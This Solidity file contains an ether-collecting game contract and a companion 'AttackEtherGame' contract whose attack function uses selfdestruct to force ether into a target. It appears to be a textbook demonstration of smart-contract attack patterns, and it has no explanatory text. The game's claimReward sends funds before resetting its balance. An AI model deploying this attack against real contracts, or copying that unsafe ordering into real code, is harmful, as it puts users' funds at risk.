// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract EtherGame {
    uint256 public targetAmount = 10 ether;
    address public winner;
    address owner;
    uint256 public balance;
    bool isEnd;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    function withdrawAfterEnd() public payable onlyOwner {
        require(isEnd, "Game not finish yet.");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game over");

        if (balance == targetAmount) {
            winner = msg.sender;
            isEnd = true;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
        balance = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract AttackEtherGame {
    function attack(address _attackedAddress) public payable {
        address payable addr = payable(address(_attackedAddress));
        selfdestruct(addr);
    }

    function getAddress() public view returns (address) {
        return address(this);
    }
}
